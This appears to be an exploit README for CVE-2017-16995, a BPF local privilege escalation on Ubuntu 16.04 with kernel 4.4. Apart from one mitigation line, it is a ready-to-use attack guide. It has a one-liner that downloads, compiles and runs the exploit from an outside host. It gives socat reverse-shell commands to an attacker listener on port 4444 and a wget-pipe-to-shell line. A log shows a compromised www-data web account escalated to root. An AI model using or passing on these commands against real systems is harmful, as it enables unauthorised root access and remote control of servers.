# Ubuntu16.04-0day

### 漏洞范围： all 4.4 ubuntu aws instances are vulnerable

#### 前提条件：unprivileged_bpf_disabled sysctl未设置
#### CVE 编号： CVE-2017-16995
#### 注意: 如果不同的内核调整CRED偏移量+检查内核堆栈大小
### 漏洞测试环境
```

➜  ~ id

uid=1002(test) gid=1002(test) groups=1002(test)

➜  ~ lsb_release -a                  

Distributor ID:	Ubuntu
Description:	Ubuntu 16.04.3 LTS
Release:	16.04
Codename:	xenial

➜  ~ uname -a

Linux ubuntu 4.4.0-87-generic #110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux

➜  ~ 

```
### 参考解决方案
```

设置参数“kernel.unprivileged_bpf_disabled = 1”通过限制对bpf（2）调用的访问来防止这种特权升级
___________________________________________________________________________________________________________________________

root@Ubuntu# echo 1 > /proc/sys/kernel/unprivileged_bpf_disabled

______________________________________________________________________________________________________________________________


```



## Use-Age:

```

wget -P /tmp http://cyseclabs.com/exploits/upstream44.c &&cd /tmp && gcc -o pwned  upstream44.c && chmod 777 pwned && ./pwned 

```

### upstream44.c

```

sha256sum b71b2317c2f2461f0c25a650c9c6a4dd2399e5d7f800ec19822ba720a574030d

sha1sum d91b5dd8b074dd33bbb6994ab21af4e6279c9098

md5sum f38c046a22fd85e3aab3aa7ea4ef21a4

```


```
$ id
uid=1002(test) gid=1002(test) groups=1002(test)

$ wget -P /tmp http://cyseclabs.com/exploits/upstream44.c &&cd /tmp && gcc -o pwned  upstream44.c && chmod 777 pwned && ./pwned
--2018-03-16 17:08:09--  http://cyseclabs.com/exploits/upstream44.c
Resolving cyseclabs.com (cyseclabs.com)... 58.96.20.9
Connecting to cyseclabs.com (cyseclabs.com)|58.96.20.9|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5776 (5.6K) [application/octet-stream]
Saving to: ‘/tmp/upstream44.c.1’

upstream44.c.1                                       100%[==========================================================================>]   5.64k  --.-KB/s    in 0s
2018-03-16 17:08:10 (186 MB/s) - ‘/tmp/upstream44.c’ saved [5776/5776]

task_struct = ffff880065821980
uidptr = ffff880034edbe04
spawning root shell

root@ubuntu:/tmp# id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:kernel_t:s0
```
### 利用socat获取一个tty shell
```
hacker: 监听port

wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat file:`tty`,raw,echo=0 tcp-listen:4444

victims：弹带TTY shell 下载编译exp

wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:x.x.x.x:4444

wget -P /tmp http://cyseclabs.com/exploits/upstream44.c &&cd /tmp && gcc -o pwned  upstream44.c && chmod 777 pwned && ./pwned

or you can do that 

sh -c "$(wget http://x.x.x.x/exp.sh -O -)"

参考链接： https://wx.abbao.cn/a/13847-7cd1b6e418fa413b.html
```
### case_for_Hack
```
➜  ~ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat file:`tty`,raw,echo=0 tcp-li
sten:4444

www-data@vultr:/var/www/html$ su root
Password: 
su: Authentication failure
www-data@vultr:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@vultr:/var/www/html$ /tmp/pwned
task_struct = ffff880078bf9540
uidptr = ffff88007c3b16c4
spawning root shell

root@vultr:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
root@vultr:/var/www/html# 

```
